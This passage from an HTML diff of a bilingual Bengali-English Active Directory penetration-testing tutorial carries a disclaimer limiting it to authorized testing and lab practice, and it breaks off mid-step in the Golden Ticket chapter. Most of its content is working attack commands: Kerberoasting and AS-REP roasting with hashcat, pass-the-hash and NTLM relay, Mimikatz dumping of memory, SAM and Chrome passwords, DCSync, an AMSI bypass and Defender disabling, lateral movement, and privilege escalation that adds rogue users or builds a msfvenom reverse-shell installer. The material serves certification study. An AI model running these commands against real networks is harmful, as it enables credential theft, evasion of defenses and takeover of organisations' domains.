+      <p><span class="bn-text">এই chapter-এর সব কিছু শুধুমাত্র <strong>authorized penetration testing</strong> এবং শিক্ষামূলক উদ্দেশ্যে। OSCP, CEH-এর মতো certification exam-এ এবং corporate pentest-এ এই knowledge ব্যবহার হয়। নিজের lab environment-এ (VulnAD, GOAD, TryHackMe) practice করো।</span><span class="en-text">Everything in this chapter is strictly for <strong>authorized penetration testing</strong> and educational purposes. This knowledge is used in certification exams like OSCP, CEH, and in corporate pentests. Practice in your own lab environment (VulnAD, GOAD, TryHackMe).</span></p>
+    </div>
+  </div>
+</div>
+
+<!-- CH 2: AD COMPONENTS -->
+<div class="chapter ch2">
+  <div class="chapter-header" data-num="02">
+    <div class="ch-label">CHAPTER 02</div>
+    <div class="ch-title">⚙️ <span class="bn-text">AD Components বিস্তারিত</span><span class="en-text">AD Components in Detail</span></div>
+    <div class="ch-desc"><span class="bn-text">Kerberos, LDAP, DNS, NTLM — AD-এর ভেতরে কীভাবে authentication হয়</span><span class="en-text">Kerberos, LDAP, DNS, NTLM — how authentication happens inside AD</span></div>
+  </div>
+  <div class="chapter-body">
+
+    <h2 class="sec"><span class="bn-text">Kerberos Authentication — কীভাবে কাজ করে?</span><span class="en-text">Kerberos Authentication — How Does It Work?</span></h2>
+    <div class="ad-diagram">
+<span class="bn-text">পদক্ষেপ ১:</span><span class="en-text">Step 1:</span> Client → <span class="ad-w">KDC (DC)</span>: "আমি Alice, আমাকে TGT দাও"
+         KDC Alice-এর password hash দিয়ে encrypt করা <span class="ad-g">TGT</span> পাঠায়
+
+<span class="bn-text">পদক্ষেপ ২:</span><span class="en-text">Step 2:</span> Client → <span class="ad-w">KDC</span>: "TGT আছে, এখন File Server-এর ticket চাই"
+         KDC <span class="ad-y">Service Ticket (TGS)</span> দেয়
+
+<span class="bn-text">পদক্ষেপ ৩:</span><span class="en-text">Step 3:</span> Client → <span class="ad-d">File Server</span>: "TGS আছে, access দাও"
+         File Server verify করে → Access দেয়
+
+<span class="ad-r">Attacker এখানে কোথায় attack করে?</span>
+  • TGT চুরি        → <span class="ad-r">Pass-the-Ticket</span>
+  • TGS চুরি        → <span class="ad-r">Kerberoasting (offline crack)</span>
+  • KRBTGT hash     → <span class="ad-r">Golden Ticket</span>
+  • Service hash    → <span class="ad-r">Silver Ticket</span>
+    </div>
+
+    <h2 class="sec"><span class="bn-text">NTLM vs Kerberos</span><span class="en-text">NTLM vs Kerberos</span></h2>
+    <table>
+      <thead><tr><th></th><th>NTLM</th><th>Kerberos</th></tr></thead>
+      <tbody>
+        <tr><td><strong><span class="bn-text">Authentication</span><span class="en-text">Authentication</span></strong></td><td><span class="bn-text">Challenge-Response</span><span class="en-text">Challenge-Response</span></td><td><span class="bn-text">Ticket-based</span><span class="en-text">Ticket-based</span></td></tr>
+        <tr><td><strong><span class="bn-text">নিরাপত্তা</span><span class="en-text">Security</span></strong></td><td><span class="badge badge-r">WEAK</span></td><td><span class="badge badge-g">BETTER</span></td></tr>
+        <tr><td><strong><span class="bn-text">Attack</span><span class="en-text">Attack</span></strong></td><td>Pass-the-Hash, Relay</td><td>Kerberoasting, Golden Ticket</td></tr>
+        <tr><td><strong><span class="bn-text">কখন ব্যবহার হয়</span><span class="en-text">When used</span></strong></td><td><span class="bn-text">IP address দিয়ে connect</span><span class="en-text">Connect via IP address</span></td><td><span class="bn-text">Hostname/FQDN দিয়ে connect</span><span class="en-text">Connect via hostname/FQDN</span></td></tr>
+        <tr><td><strong>Capture</strong></td><td>Responder দিয়ে</td><td>TGS request intercept</td></tr>
+      </tbody>
+    </table>
+
+    <h2 class="sec"><span class="bn-text">গুরুত্বপূর্ণ AD Ports</span><span class="en-text">Important AD Ports</span></h2>
+    <div class="grid2">
+      <div class="card b-card">
+        <h4>🔌 <span class="bn-text">AD Services ও Ports</span><span class="en-text">AD Services & Ports</span></h4>
+        <ul style="font-size:12.5px;">
+          <li><code>53</code>   — DNS</li>
+          <li><code>88</code>   — Kerberos</li>
+          <li><code>135</code>  — RPC</li>
+          <li><code>139/445</code> — SMB</li>
+          <li><code>389</code>  — LDAP</li>
+          <li><code>636</code>  — LDAPS (SSL)</li>
+          <li><code>3268</code> — Global Catalog</li>
+          <li><code>5985</code> — WinRM (HTTP)</li>
+          <li><code>3389</code> — RDP</li>
+        </ul>
+      </div>
+      <div class="card g-card">
+        <h4>🔍 <span class="bn-text">DC খোঁজার Nmap Command</span><span class="en-text">Nmap Command to Find DCs</span></h4>
+        <div class="code" style="margin:8px 0; font-size:11.5px;">
+<span class="c"># DC খোঁজা</span>
+nmap -p 88,389,445 192.168.1.0/24
+nmap -p 88 --open 192.168.1.0/24
+
+<span class="c"># AD scan</span>
+nmap -sV -p 53,88,135,139,389,445,636,3268,3389 DC_IP
+
+<span class="c"># SMB signing check</span>
+nmap --script smb2-security-mode -p445 IP
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- CH 3: ENUMERATION -->
+<div class="chapter ch3">
+  <div class="chapter-header" data-num="03">
+    <div class="ch-label">CHAPTER 03</div>
+    <div class="ch-title">🔍 <span class="bn-text">AD Enumeration</span><span class="en-text">AD Enumeration</span></div>
+    <div class="ch-desc"><span class="bn-text">Domain-এ ঢোকার পর users, groups, computers, SPNs — সব তথ্য বের করা</span><span class="en-text">After gaining access to the domain — extracting all info on users, groups, computers, SPNs</span></div>
+  </div>
+  <div class="chapter-body">
+
+    <h2 class="sec"><span class="bn-text">BloodHound — AD Attack Path Mapper</span><span class="en-text">BloodHound — AD Attack Path Mapper</span></h2>
+    <p><span class="bn-text">BloodHound হলো সবচেয়ে শক্তিশালী AD enumeration tool। এটা AD-এর সব relationship graph করে দেখায় এবং Domain Admin পর্যন্ত যাওয়ার সবচেয়ে সহজ পথ বের করে।</span><span class="en-text">BloodHound is the most powerful AD enumeration tool. It graphs all AD relationships and finds the easiest path to Domain Admin.</span></p>
+    <div class="code">
+<span class="c"># SharpHound — Data collector (Windows-এ চালাও)</span>
+<span class="p">PS></span> .\SharpHound.exe -c All
+<span class="p">PS></span> .\SharpHound.exe -c DCOnly          <span class="c"># শুধু DC data</span>
+<span class="p">PS></span> .\SharpHound.exe -c All --zip        <span class="c"># ZIP করে</span>
+
+<span class="c"># Python BloodHound (Linux থেকেও চালানো যায়)</span>
+<span class="p">$</span> bloodhound-python -u alice -p Password123 -d corp.local -dc DC01.corp.local -c All
+<span class="p">$</span> bloodhound-python -u alice -p Pass123 -d corp.local -ns DC_IP --zip
+
+<span class="c"># BloodHound গুরুত্বপূর্ণ Queries:</span>
+<span class="c"># "Find all Domain Admins"</span>
+<span class="c"># "Find Shortest Path to Domain Admins"</span>
+<span class="c"># "Find Principals with DCSync Rights"</span>
+<span class="c"># "Find Kerberoastable Accounts"</span>
+<span class="c"># "Find AS-REP Roastable Users"</span>
+    </div>
+
+    <h2 class="sec"><span class="bn-text">PowerView — PowerShell Enumeration</span><span class="en-text">PowerView — PowerShell Enumeration</span></h2>
+    <div class="code">
+<span class="c"># PowerView load করা</span>
+<span class="p">PS></span> Import-Module .\PowerView.ps1
+<span class="p">PS></span> . .\PowerView.ps1
+
+<span class="c"># Domain Information</span>
+<span class="p">PS></span> Get-Domain
+<span class="p">PS></span> Get-DomainController
+<span class="p">PS></span> Get-DomainTrust
+
+<span class="c"># Users</span>
+<span class="p">PS></span> Get-DomainUser | select samaccountname, description
+<span class="p">PS></span> Get-DomainUser -SPN                    <span class="c"># Service accounts (Kerberoasting)</span>
+<span class="p">PS></span> Get-DomainUser -PreauthNotRequired     <span class="c"># ASREPRoast candidates</span>
+
+<span class="c"># Groups</span>
+<span class="p">PS></span> Get-DomainGroup "Domain Admins" | select member
+<span class="p">PS></span> Get-DomainGroupMember "Domain Admins"
+
+<span class="c"># Computers</span>
+<span class="p">PS></span> Get-DomainComputer | select dnshostname, operatingsystem
+<span class="p">PS></span> Get-DomainComputer -Unconstrained     <span class="c"># Unconstrained delegation</span>
+
+<span class="c"># Share এবং local admin খোঁজা</span>
+<span class="p">PS></span> Find-DomainShare
+<span class="p">PS></span> Find-LocalAdminAccess                  <span class="c"># কোথায় local admin আছে</span>
+<span class="p">PS></span> Find-DomainUserLocation               <span class="c"># User কোথায় logged in</span>
+
+<span class="c"># ACL/Permission Analysis</span>
+<span class="p">PS></span> Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs
+    </div>
+
+    <h2 class="sec"><span class="bn-text">Linux থেকে AD Enumeration</span><span class="en-text">AD Enumeration from Linux</span></h2>
+    <div class="code">
+<span class="c"># enum4linux-ng</span>
+<span class="p">$</span> enum4linux-ng -A DC_IP
+<span class="p">$</span> enum4linux -a DC_IP
+
+<span class="c"># ldapdomaindump</span>
+<span class="p">$</span> ldapdomaindump -u 'corp.local\alice' -p 'Password123' DC_IP
+<span class="p">$</span> ldapdomaindump ldap://DC_IP -u 'corp\alice' -p 'Pass' --no-json
+
+<span class="c"># CrackMapExec — সবচেয়ে versatile</span>
+<span class="p">$</span> crackmapexec smb DC_IP -u alice -p Pass123 --users
+<span class="p">$</span> crackmapexec smb DC_IP -u alice -p Pass123 --groups
+<span class="p">$</span> crackmapexec smb DC_IP -u alice -p Pass123 --shares
+<span class="p">$</span> crackmapexec smb DC_IP -u alice -p Pass123 --pass-pol
+<span class="p">$</span> crackmapexec smb 192.168.1.0/24 -u alice -p Pass123    <span class="c"># Subnet scan</span>
+
+<span class="c"># Impacket tools</span>
+<span class="p">$</span> impacket-GetADUsers -all corp.local/alice:Pass123 -dc-ip DC_IP
+    </div>
+
+    <div class="ch-summary">
+      <h3>// <span class="bn-text">Enumeration চেকলিস্ট</span><span class="en-text">Enumeration Checklist</span> //</h3>
+      <ul>
+        <li>✅ <span class="bn-text">Domain Controller IP ও hostname বের করো</span><span class="en-text">Find Domain Controller IP and hostname</span></li>
+        <li>✅ <span class="bn-text">BloodHound দিয়ে সব data collect করো</span><span class="en-text">Collect all data with BloodHound</span></li>
+        <li>✅ <span class="bn-text">Kerberoastable accounts খোঁজো (SPN set)</span><span class="en-text">Find Kerberoastable accounts (SPN set)</span></li>
+        <li>✅ <span class="bn-text">AS-REP Roastable users খোঁজো (preauth disabled)</span><span class="en-text">Find AS-REP Roastable users (preauth disabled)</span></li>
+        <li>✅ <span class="bn-text">Local admin কোথায় আছে বের করো</span><span class="en-text">Find where you have local admin</span></li>
+        <li>✅ <span class="bn-text">Unconstrained delegation খোঁজো</span><span class="en-text">Find unconstrained delegation</span></li>
+      </ul>
+    </div>
+  </div>
+</div>
+
+<!-- CH 4: KERBEROS ATTACKS -->
+<div class="chapter ch4">
+  <div class="chapter-header" data-num="04">
+    <div class="ch-label">CHAPTER 04</div>
+    <div class="ch-title">🎭 Kerberos Attacks — <span class="bn-text">Kerberoasting ও ASREPRoasting</span><span class="en-text">Kerberoasting & ASREPRoasting</span></div>
+    <div class="ch-desc"><span class="bn-text">Service ticket চুরি করে offline crack — AD-এর সবচেয়ে common attack</span><span class="en-text">Stealing service tickets and cracking offline — the most common AD attack</span></div>
+  </div>
+  <div class="chapter-body">
+
+    <h2 class="sec"><span class="bn-text">Kerberoasting — কীভাবে কাজ করে?</span><span class="en-text">Kerberoasting — How Does It Work?</span></h2>
+    <p><span class="bn-text">যে accounts-এর SPN (Service Principal Name) set আছে, সেগুলোর জন্য যেকোনো domain user Service Ticket (TGS) request করতে পারে। এই ticket service account-এর password hash দিয়ে encrypt করা — তাই offline crack করা যায়!</span><span class="en-text">For accounts with a Service Principal Name (SPN) set, any domain user can request a Service Ticket (TGS). This ticket is encrypted with the service account's password hash — so it can be cracked offline!</span></p>
+
+    <div class="code">
+<span class="c"># Step 1: SPN account খোঁজা</span>
+<span class="p">PS></span> Get-DomainUser -SPN | select samaccountname, serviceprincipalname
+
+<span class="c"># Step 2: TGS ticket request করা (Windows)</span>
+<span class="p">PS></span> .\Rubeus.exe kerberoast /output:hashes.txt
+<span class="p">PS></span> .\Rubeus.exe kerberoast /user:sqlservice /nowrap
+
+<span class="c"># Step 3: Linux থেকে (Impacket)</span>
+<span class="p">$</span> impacket-GetUserSPNs corp.local/alice:Pass123 -dc-ip DC_IP -request
+<span class="p">$</span> impacket-GetUserSPNs corp.local/alice:Pass123 -dc-ip DC_IP -request -outputfile hashes.txt
+
+<span class="c"># Step 4: Hashcat দিয়ে crack করো</span>
+<span class="p">$</span> hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
+<span class="p">$</span> hashcat -m 13100 hashes.txt rockyou.txt -r best64.rule --show
+    </div>
+
+    <h2 class="sec"><span class="bn-text">AS-REP Roasting</span><span class="en-text">AS-REP Roasting</span></h2>
+    <p><span class="bn-text">যেসব user account-এ "Do not require Kerberos preauthentication" চালু আছে, তাদের AS-REP response কোনো authentication ছাড়াই পাওয়া যায় এবং offline crack করা যায়।</span><span class="en-text">For user accounts with "Do not require Kerberos preauthentication" enabled, the AS-REP response can be obtained without authentication and cracked offline.</span></p>
+    <div class="code">
+<span class="c"># Vulnerable users খোঁজা</span>
+<span class="p">PS></span> Get-DomainUser -PreauthNotRequired | select samaccountname
+
+<span class="c"># AS-REP hash সংগ্রহ করা (Windows)</span>
+<span class="p">PS></span> .\Rubeus.exe asreproast /format:hashcat /output:asrep.txt
+
+<span class="c"># Linux থেকে (Impacket)</span>
+<span class="p">$</span> impacket-GetNPUsers corp.local/ -usersfile users.txt -dc-ip DC_IP -format hashcat
+<span class="p">$</span> impacket-GetNPUsers corp.local/alice:Pass123 -dc-ip DC_IP -request
+
+<span class="c"># Crack করো (Hashcat mode 18200)</span>
+<span class="p">$</span> hashcat -m 18200 asrep.txt rockyou.txt
+    </div>
+
+    <div class="ch-summary">
+      <h3>// Kerberoasting vs ASREPRoasting //</h3>
+      <ul>
+        <li>🎭 <strong>Kerberoasting</strong> — <span class="bn-text">যেকোনো domain user করতে পারে; SPN থাকলেই হয়</span><span class="en-text">Any domain user can do it; just needs an SPN</span></li>
+        <li>🎭 <strong>ASREPRoasting</strong> — <span class="bn-text">Authentication ছাড়াই করা যায়; preauth disabled থাকলে</span><span class="en-text">Can be done without authentication; if preauth is disabled</span></li>
+        <li>⚡ <span class="bn-text">দুটোই offline crack — network noise কম</span><span class="en-text">Both are offline cracks — minimal network noise</span></li>
+        <li>🔑 <span class="bn-text">Weak password থাকলে minutes-এ crack হয়</span><span class="en-text">Cracks in minutes if the password is weak</span></li>
+      </ul>
+    </div>
+  </div>
+</div>
+
+<!-- CH 5: PASS-THE-HASH -->
+<div class="chapter ch5">
+  <div class="chapter-header" data-num="05">
+    <div class="ch-label">CHAPTER 05</div>
+    <div class="ch-title">🔑 Pass-the-Hash <span class="bn-text">ও</span><span class="en-text">&</span> Pass-the-Ticket</div>
+    <div class="ch-desc"><span class="bn-text">Password না জেনেও hash বা ticket দিয়ে authenticate করার কৌশল</span><span class="en-text">Techniques for authenticating using just a hash or ticket without knowing the password</span></div>
+  </div>
+  <div class="chapter-body">
+
+    <h2 class="sec"><span class="bn-text">Pass-the-Hash (PtH)</span><span class="en-text">Pass-the-Hash (PtH)</span></h2>
+    <p><span class="bn-text">NTLM authentication-এ password-এর জায়গায় hash ব্যবহার করা যায়। Mimikatz বা Impacket দিয়ে hash dump করার পর password না জেনেও সেই user হিসেবে network-এ access পাওয়া যায়।</span><span class="en-text">In NTLM authentication, a hash can be used in place of the password. After dumping the hash with Mimikatz or Impacket, you can access the network as that user without knowing the password.</span></p>
+    <div class="code">
+<span class="c"># Impacket — PtH দিয়ে remote command execution</span>
+<span class="p">$</span> impacket-psexec corp.local/administrator@TARGET_IP -hashes :8846f7eaee8fb117ad06bdd830b7586c
+
+<span class="c"># WMI দিয়ে</span>
+<span class="p">$</span> impacket-wmiexec corp.local/administrator@TARGET_IP -hashes :NTLM_HASH
+
+<span class="c"># SMBExec</span>
+<span class="p">$</span> impacket-smbexec corp.local/admin@TARGET_IP -hashes :NTLM_HASH
+
+<span class="c"># CrackMapExec দিয়ে subnet-এ PtH</span>
+<span class="p">$</span> crackmapexec smb 192.168.1.0/24 -u administrator -H NTLM_HASH
+<span class="p">$</span> crackmapexec smb 192.168.1.0/24 -u administrator -H HASH --sam  <span class="c"># Dump SAM</span>
+
+<span class="c"># Mimikatz দিয়ে PtH (Windows)</span>
+<span class="p">mimikatz#</span> sekurlsa::pth /user:administrator /domain:corp.local /ntlm:HASH_HERE /run:cmd.exe
+    </div>
+
+    <h2 class="sec"><span class="bn-text">Pass-the-Ticket (PtT)</span><span class="en-text">Pass-the-Ticket (PtT)</span></h2>
+    <div class="code">
+<span class="c"># Rubeus দিয়ে ticket export</span>
+<span class="p">PS></span> .\Rubeus.exe dump /service:krbtgt /nowrap
+<span class="p">PS></span> .\Rubeus.exe dump /luid:0x3e4
+
+<span class="c"># Ticket import করা</span>
+<span class="p">PS></span> .\Rubeus.exe ptt /ticket:BASE64_TICKET
+
+<span class="c"># Mimikatz দিয়ে</span>
+<span class="p">mimikatz#</span> sekurlsa::tickets /export
+<span class="p">mimikatz#</span> kerberos::ptt ticket.kirbi
+
+<span class="c"># Linux (Impacket)</span>
+<span class="p">$</span> export KRB5CCNAME=ticket.ccache
+<span class="p">$</span> impacket-psexec -k -no-pass corp.local/alice@DC01.corp.local
+    </div>
+
+    <h2 class="sec"><span class="bn-text">NTLM Relay Attack</span><span class="en-text">NTLM Relay Attack</span></h2>
+    <div class="code">
+<span class="c"># Responder — NTLM hash capture</span>
+<span class="p">$</span> responder -I eth0 -rdwv
+<span class="c"># NetNTLMv2 hash পাবে → hashcat -m 5600 দিয়ে crack</span>
+
+<span class="c"># ntlmrelayx — captured hash relay করে command execute</span>
+<span class="p">$</span> impacket-ntlmrelayx -tf targets.txt -smb2support
+<span class="p">$</span> impacket-ntlmrelayx -tf targets.txt -smb2support -c "whoami"
+<span class="p">$</span> impacket-ntlmrelayx -tf targets.txt -smb2support --dump-adcs  <span class="c"># Certificate theft</span>
+    </div>
+  </div>
+</div>
+
+<!-- CH 6: MIMIKATZ -->
+<div class="chapter ch6">
+  <div class="chapter-header" data-num="06">
+    <div class="ch-label">CHAPTER 06</div>
+    <div class="ch-title">🔓 Mimikatz — <span class="bn-text">Credential Dumping</span><span class="en-text">Credential Dumping</span></div>
+    <div class="ch-desc"><span class="bn-text">Windows memory থেকে password, hash, ticket বের করার সবচেয়ে বিখ্যাত tool</span><span class="en-text">The most famous tool for extracting passwords, hashes, and tickets from Windows memory</span></div>
+  </div>
+  <div class="chapter-body">
+
+    <h2 class="sec"><span class="bn-text">Mimikatz Basic Usage</span><span class="en-text">Mimikatz Basic Usage</span></h2>
+    <div class="code">
+<span class="c"># Mimikatz চালানো (Admin/SYSTEM দরকার)</span>
+<span class="p">PS></span> .\mimikatz.exe
+
+<span class="c"># Privilege escalate</span>
+<span class="p">mimikatz#</span> privilege::debug
+<span class="g">[20] OK</span>
+
+<span class="c"># Logon passwords — সবচেয়ে গুরুত্বপূর্ণ command</span>
+<span class="p">mimikatz#</span> sekurlsa::logonpasswords
+<span class="g">[Output: username, domain, NTLM hash, plaintext password (যদি থাকে)]</span>
+
+<span class="c"># Kerberos tickets dump</span>
+<span class="p">mimikatz#</span> sekurlsa::tickets /export
+
+<span class="c"># SAM database dump</span>
+<span class="p">mimikatz#</span> token::elevate
+<span class="p">mimikatz#</span> lsadump::sam
+
+<span class="c"># LSA Secrets</span>
+<span class="p">mimikatz#</span> lsadump::secrets
+
+<span class="c"># DPAPI — saved browser passwords</span>
+<span class="p">mimikatz#</span> dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Login Data" /unprotect
+    </div>
+
+    <h2 class="sec"><span class="bn-text">DCSync — Domain Controller Imitate করা</span><span class="en-text">DCSync — Impersonating a Domain Controller</span></h2>
+    <p><span class="bn-text">DCSync attack-এ আমরা একটি নকল DC হিসেবে কাজ করি এবং real DC থেকে user password hashes replicate করি — physically DC-তে না গিয়েও!</span><span class="en-text">In a DCSync attack, we act as a fake DC and replicate user password hashes from the real DC — without physically touching the DC!</span></p>
+    <div class="code">
+<span class="c"># Mimikatz DCSync (Domain Admin বা DCSync rights দরকার)</span>
+<span class="p">mimikatz#</span> lsadump::dcsync /domain:corp.local /user:administrator
+<span class="p">mimikatz#</span> lsadump::dcsync /domain:corp.local /user:krbtgt    <span class="c"># Golden Ticket-এর জন্য!</span>
+<span class="p">mimikatz#</span> lsadump::dcsync /domain:corp.local /all /csv
+
+<span class="c"># Impacket secretsdump (Linux থেকে)</span>
+<span class="p">$</span> impacket-secretsdump corp.local/administrator:Pass@DC_IP
+<span class="p">$</span> impacket-secretsdump corp.local/admin@DC_IP -hashes :NTLM_HASH
+<span class="p">$</span> impacket-secretsdump -just-dc-ntlm corp.local/admin:Pass@DC_IP
+    </div>
+
+    <h2 class="sec"><span class="bn-text">Windows Defender Bypass</span><span class="en-text">Windows Defender Bypass</span></h2>
+    <div class="code">
+<span class="c"># AMSI Bypass (PowerShell)</span>
+<span class="p">PS></span> [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+
+<span class="c"># Defender disable (Admin দরকার)</span>
+<span class="p">PS></span> Set-MpPreference -DisableRealtimeMonitoring $true
+<span class="p">PS></span> Add-MpPreference -ExclusionPath "C:\Tools"
+
+<span class="c"># Obfuscated Mimikatz alternatives</span>
+<span class="c"># Invoke-Mimikatz (PowerShell version)</span>
+<span class="c"># SafetyKatz (obfuscated)</span>
+<span class="c"># BetterSafetyKatz</span>
+<span class="c"># SharpKatz</span>
+    </div>
+  </div>
+</div>
+
+<!-- CH 7: LATERAL MOVEMENT -->
+<div class="chapter ch7">
+  <div class="chapter-header" data-num="07">
+    <div class="ch-label">CHAPTER 07</div>
+    <div class="ch-title">↗️ <span class="bn-text">Lateral Movement</span><span class="en-text">Lateral Movement</span></div>
+    <div class="ch-desc"><span class="bn-text">একটা machine থেকে অন্য machine-এ যাওয়ার কৌশল — network-এ ছড়িয়ে পড়া</span><span class="en-text">Techniques for moving from one machine to another — spreading across the network</span></div>
+  </div>
+  <div class="chapter-body">
+
+    <h2 class="sec"><span class="bn-text">PsExec — Remote Command Execution</span><span class="en-text">PsExec — Remote Command Execution</span></h2>
+    <div class="code">
+<span class="c"># Impacket PsExec (Linux থেকে)</span>
+<span class="p">$</span> impacket-psexec corp.local/admin:Password@TARGET_IP
+<span class="p">$</span> impacket-psexec corp.local/admin@TARGET_IP -hashes :NTLM_HASH
+
+<span class="c"># Sysinternals PsExec (Windows থেকে)</span>
+<span class="p">PS></span> .\PsExec.exe \\TARGET_IP -u CORP\admin -p Password cmd.exe
+<span class="p">PS></span> .\PsExec.exe \\TARGET_IP cmd.exe  <span class="c"># current credentials use করে</span>
+    </div>
+
+    <h2 class="sec"><span class="bn-text">WMI ও WinRM</span><span class="en-text">WMI & WinRM</span></h2>
+    <div class="code">
+<span class="c"># WMI (Port 135) — stealthy, কম log</span>
+<span class="p">$</span> impacket-wmiexec corp.local/admin:Pass@TARGET_IP
+<span class="p">PS></span> Invoke-WmiMethod -ComputerName TARGET -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c whoami > C:\output.txt"
+
+<span class="c"># WinRM (Port 5985/5986) — PowerShell remoting</span>
+<span class="p">PS></span> Enter-PSSession -ComputerName TARGET -Credential CORP\admin
+<span class="p">PS></span> Invoke-Command -ComputerName TARGET -ScriptBlock { whoami }
+<span class="p">$</span> evil-winrm -i TARGET_IP -u admin -p Password123
+<span class="p">$</span> evil-winrm -i TARGET_IP -u admin -H NTLM_HASH
+    </div>
+
+    <h2 class="sec"><span class="bn-text">SMB ও RDP</span><span class="en-text">SMB & RDP</span></h2>
+    <div class="code">
+<span class="c"># SMB — File share access</span>
+<span class="p">$</span> smbclient //TARGET_IP/C$ -U 'CORP\admin%Password'
+<span class="p">$</span> crackmapexec smb TARGET_IP -u admin -p Pass --shares
+<span class="p">$</span> crackmapexec smb TARGET_IP -u admin -p Pass -x "whoami"
+
+<span class="c"># RDP (Port 3389)</span>
+<span class="p">$</span> xfreerdp /u:admin /p:Password /v:TARGET_IP
+<span class="p">$</span> xfreerdp /u:admin /pth:NTLM_HASH /v:TARGET_IP   <span class="c"># PtH via RDP</span>
+<span class="p">$</span> rdesktop TARGET_IP -u admin -p Password
+
+<span class="c"># Enable RDP remotely</span>
+<span class="p">PS></span> Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
+<span class="p">PS></span> reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+    </div>
+  </div>
+</div>
+
+<!-- CH 8: WINDOWS PRIVESC -->
+<div class="chapter ch8">
+  <div class="chapter-header" data-num="08">
+    <div class="ch-label">CHAPTER 08</div>
+    <div class="ch-title">⬆️ <span class="bn-text">Windows Privilege Escalation</span><span class="en-text">Windows Privilege Escalation</span></div>
+    <div class="ch-desc"><span class="bn-text">Normal user থেকে SYSTEM/Administrator — Windows-এ সব PrivEsc technique</span><span class="en-text">From normal user to SYSTEM/Administrator — all Windows PrivEsc techniques</span></div>
+  </div>
+  <div class="chapter-body">
+
+    <h2 class="sec"><span class="bn-text">WinPEAS — Automated Enumeration</span><span class="en-text">WinPEAS — Automated Enumeration</span></h2>
+    <div class="code">
+<span class="c"># WinPEAS চালানো</span>
+<span class="p">PS></span> .\winpeas.exe
+<span class="p">PS></span> .\winpeas.exe quiet           <span class="c"># Less verbose</span>
+<span class="p">PS></span> .\winpeas.exe systeminfo       <span class="c"># System info only</span>
+<span class="p">PS></span> .\winpeas.exe > output.txt
+
+<span class="c"># Manual checks</span>
+<span class="p">PS></span> whoami /all                    <span class="c"># User info + privileges</span>
+<span class="p">PS></span> whoami /priv                   <span class="c"># Privileges</span>
+<span class="p">PS></span> net user                       <span class="c"># Local users</span>
+<span class="p">PS></span> net localgroup administrators  <span class="c"># Local admins</span>
+<span class="p">PS></span> systeminfo                     <span class="c"># OS + patch level</span>
+<span class="p">PS></span> wmic qfe get Caption,Description,HotFixID,InstalledOn  <span class="c"># Patches</span>
+<span class="p">PS></span> Get-HotFix | sort InstalledOn -Descending
+    </div>
+
+    <h2 class="sec"><span class="bn-text">Token Impersonation</span><span class="en-text">Token Impersonation</span></h2>
+    <div class="code">
+<span class="c"># SeImpersonatePrivilege → SYSTEM সম্ভব</span>
+<span class="p">PS></span> whoami /priv | findstr Impersonate
+
+<span class="c"># PrintSpoofer</span>
+<span class="p">PS></span> .\PrintSpoofer.exe -i -c cmd
+
+<span class="c"># JuicyPotato / RoguePotato / GodPotato</span>
+<span class="p">PS></span> .\JuicyPotato.exe -l 1337 -c "{CLSID}" -p C:\Windows\system32\cmd.exe -a "/c net user hacker Pass123! /add"
+<span class="p">PS></span> .\GodPotato.exe -cmd "cmd /c whoami"
+
+<span class="c"># Meterpreter Token Impersonation</span>
+<span class="p">meterpreter></span> use incognito
+<span class="p">meterpreter></span> list_tokens -u
+<span class="p">meterpreter></span> impersonate_token "NT AUTHORITY\\SYSTEM"
+    </div>
+
+    <h2 class="sec"><span class="bn-text">Common PrivEsc Techniques</span><span class="en-text">Common PrivEsc Techniques</span></h2>
+    <div class="grid2">
+      <div class="card r-card">
+        <h4>🔴 <span class="bn-text">Service Misconfiguration</span><span class="en-text">Service Misconfiguration</span></h4>
+        <div class="code" style="margin:6px 0; font-size:11px;">
+<span class="c"># Unquoted service path</span>
+wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """
+
+<span class="c"># Weak service permission</span>
+.\accesschk.exe -uwcqv "Everyone" *
+sc config VulnService binpath= "cmd /c net user h P /add"
+        </div>
+      </div>
+      <div class="card p-card">
+        <h4>🟣 AlwaysInstallElevated</h4>
+        <div class="code" style="margin:6px 0; font-size:11px;">
+<span class="c"># Check</span>
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+
+<span class="c"># Exploit (msfvenom .msi)</span>
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f msi -o evil.msi
+msiexec /quiet /qn /i evil.msi
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- CH 9: DOMAIN COMPROMISE -->
+<div class="chapter ch9">
+  <div class="chapter-header" data-num="09">
+    <div class="ch-label">CHAPTER 09</div>
+    <div class="ch-title">👑 <span class="bn-text">Domain Compromise — Golden Ticket ও DCSync</span><span class="en-text">Domain Compromise — Golden Ticket & DCSync</span></div>
+    <div class="ch-desc"><span class="bn-text">Domain Admin পাওয়ার পর — পুরো AD নেওয়ার চূড়ান্ত কৌশল</span><span class="en-text">After getting Domain Admin — the ultimate technique to take over all of AD</span></div>
+  </div>
+  <div class="chapter-body">
+
+    <h2 class="sec"><span class="bn-text">Golden Ticket — অসীম access</span><span class="en-text">Golden Ticket — Unlimited Access</span></h2>
+    <p><span class="bn-text">KRBTGT account-এর NTLM hash দিয়ে নিজে TGT তৈরি করা যায় — যেকোনো user হিসেবে, যেকোনো service-এ access, ১০ বছর পর্যন্ত মেয়াদ। এটাই Golden Ticket।</span><span class="en-text">Using the KRBTGT account's NTLM hash, you can forge a TGT — as any user, with access to any service, valid for up to 10 years. This is the Golden Ticket.</span></p>
+    <div class="code">
+<span class="c"># Step 1: KRBTGT hash সংগ্রহ করো (DCSync)</span>
+<span class="p">mimikatz#</span> lsadump::dcsync /domain:corp.local /user:krbtgt
+<span class="c"># Note করো: NTLM hash ও Domain SID</span>
+
+<span class="c"># Step 2: Golden Ticket তৈরি করো</span>
